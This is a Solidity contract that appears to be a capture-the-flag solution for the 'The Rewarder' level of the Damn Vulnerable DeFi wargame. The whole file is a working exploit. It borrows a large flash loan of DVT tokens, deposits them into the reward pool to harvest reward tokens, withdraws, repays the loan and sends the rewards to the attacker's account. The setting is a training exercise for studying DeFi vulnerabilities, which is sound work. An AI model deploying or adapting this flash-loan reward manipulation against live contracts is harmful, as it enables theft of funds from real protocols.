// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";


contract ExploitTheRewarder {
    using Address for address payable;

    // Receiver needs to know the pool it is receiving from
    FlashLoanerPool private immutable pool;
    DamnValuableToken private immutable dvt;
    TheRewarderPool private immutable rewarder;
    RewardToken private immutable rewardtoken;
    address payable poolAddr;

    // attacker
    address private immutable owner;

    constructor(address payable dvtAddress,
                address payable poolAddress,
                address payable rewarderAddress,
                address payable reward) {
        pool = FlashLoanerPool(poolAddress);
        poolAddr = poolAddress;
        dvt = DamnValuableToken(dvtAddress);
        rewarder = TheRewarderPool(rewarderAddress);
        rewardtoken = RewardToken(reward);
        owner = msg.sender;
    }

    function exploit() public payable {

        require(msg.sender == owner);

        // interact with the pool, calling the flashLoan will cause
        // the receiveFlashloan routine to be invoked
        pool.flashLoan(1000000 ether);

    }

    function receiveFlashLoan(uint256 amount) public payable {
        // make a deposit of the received funds to trigger rewards
        console.log("Attacker contract: Initial token balance: ", dvt.balanceOf(address(this)));
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        console.log("Attacker contract: After depositing tokens to Rewards contract: ", dvt.balanceOf(address(this)));
        // withdraw the tokens from rewards
        rewarder.withdraw(amount);
        console.log("After Withdraw from rewards: ", dvt.balanceOf(address(this)));
        // and return it to the pool
        dvt.transfer(address(pool), amount);
        console.log("After payback pool: ", dvt.balanceOf(address(pool)));        
        uint256 reward_amount = rewardtoken.balanceOf(address(this));
        console.log("Attacker contract: Received: ", reward_amount, " RewardTokens");
        // transfer the received rewards to attacker EOA from attacker contract
        rewardtoken.transfer(owner, reward_amount);
        console.log("Attacker contract: RewardTokens after Transfer RewardTokens to Attacker EOA: ", rewardtoken.balanceOf(address(this)));
    }
}